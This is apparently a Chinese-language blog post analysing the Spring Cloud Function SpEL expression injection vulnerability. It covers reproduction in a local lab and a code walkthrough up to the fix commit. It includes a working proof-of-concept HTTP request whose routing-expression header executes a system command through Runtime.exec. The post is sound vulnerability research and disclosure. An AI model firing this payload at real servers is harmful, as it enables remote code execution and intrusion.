---
layout: mypost
title: Spring Cloud Function SPEL表达式注入漏洞
categories: [漏洞分析]

---

### 一：漏洞简介

Spring Cloud 中的 serveless框架 Spring Cloud Function 中的 RoutingFunction 类的 apply 方法将请求头中的spring.cloud.function.routing-expression参数作为 Spel 表达式进行处理，造成Spel表达式注入，攻击者可通过该漏洞执行任意代码。

### 二：影响版本

3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2

### 三：漏洞复现

这里使用https://github.com/spring-cloud/spring-cloud-function中的项目进行复现

将该项目clone下来后在idea中导入这个项目：spring-cloud-function-3.1.6\spring-cloud-function-samples\function-sample-pojo

导入后等待idea下载完成依赖之后直接启动项目，启动完成后访问:127.0.0.1:8080出现以下页面代表启动成功：

![Spring_Cloud_Function_SPEL表达式注入_1.png](Spring_Cloud_Function_SPEL表达式注入_1.png)

然后我们直接上burp

POC

```
POST /functionRouter HTTP/1.1
Host: 192.168.248.6:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("calc")
Content-Length: 7

hhhhhhh
```

使用burp直接发送poc

![Spring_Cloud_Function_SPEL表达式注入_2.png](Spring_Cloud_Function_SPEL表达式注入_2.png)

可以看到靶机成功弹出计算器

![Spring_Cloud_Function_SPEL表达式注入_3.png](Spring_Cloud_Function_SPEL表达式注入_3.png)



### 四：漏洞分析

在Spring cloud官网GitHub上给出了修复commit

https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f

![Spring_Cloud_Function_SPEL表达式注入_4.png](Spring_Cloud_Function_SPEL表达式注入_4.png)

并且官方还给出了poc

![Spring_Cloud_Function_SPEL表达式注入_5.png](Spring_Cloud_Function_SPEL表达式注入_5.png)

简单来说就是在请求头中添加一个spring.cloud.function.routing-expression参数，Spring Cloud Function会直接将参数值带入SPEL中查询导致SPEL注入。

那么，这个spring.cloud.function.routing-expression参数有啥用呢？这里借鉴[神风](https://www.cnblogs.com/wh4am1/p/16062306.html)大佬的一段话：

```
漏洞是出在SpringCloud Function的RoutingFunction功能上，其功能的目的本身就是为了微服务应运而生的，可以直接通过HTTP请求与单个的函数进行交互，同时为spring.cloud.function.definition参数提供您要调用的函数的名称。
例如：
"
POST /functionRouter HTTP/1.1
Host: localhost:8080
spring.cloud.function.definition: reverseString
Content-Type: text/plain
Content-Length: 3

abc
"
其结果就会在页面上输出cba，因此我们只需要在header头上指定要调用的函数名称就可以对其进行调用。
```

我们这里根据poc来跟一下它的利用过程：

发送poc后程序会对读取我们输入的内容，首先来到org.springframework.cloud.function.web.util.FunctionWebRequestProcessingHelper#processRequest方法，程序会判断当前请求是否为RoutingFunction，并将我们提交的请求头和请求体内容编译成Message并且传入FunctionInvocationWrapper的apply方法中：

![Spring_Cloud_Function_SPEL表达式注入_6.png](Spring_Cloud_Function_SPEL表达式注入_6.png)

我们跟入apply方法发现该方法又将参数信息传入doApply方法：

![Spring_Cloud_Function_SPEL表达式注入_7.png](Spring_Cloud_Function_SPEL表达式注入_7.png)

继续跟入doApply方法：

![Spring_Cloud_Function_SPEL表达式注入_8.png](Spring_Cloud_Function_SPEL表达式注入_8.png)

这里进行了一个简单的判断，然后执行到else，我们跟进RoutingFunction的apply方法

![Spring_Cloud_Function_SPEL表达式注入_9.png](Spring_Cloud_Function_SPEL表达式注入_9.png)

apply方法最后会将数据return给org.springframework.cloud.function.context.config.RoutingFunction的route方法，route方法会判断请求头中有没有spring.cloud.function.routing-expression参数

![Spring_Cloud_Function_SPEL表达式注入_10.png](Spring_Cloud_Function_SPEL表达式注入_10.png)

因为我们有该参数，所以程序进入到this.functionFromExpression()方法：

![Spring_Cloud_Function_SPEL表达式注入_11.png](Spring_Cloud_Function_SPEL表达式注入_11.png)

最终由SpelExpressionParser来解析，导致Spel表达式注入。



### 五：参考链接

https://www.cnblogs.com/wh4am1/p/16062306.html



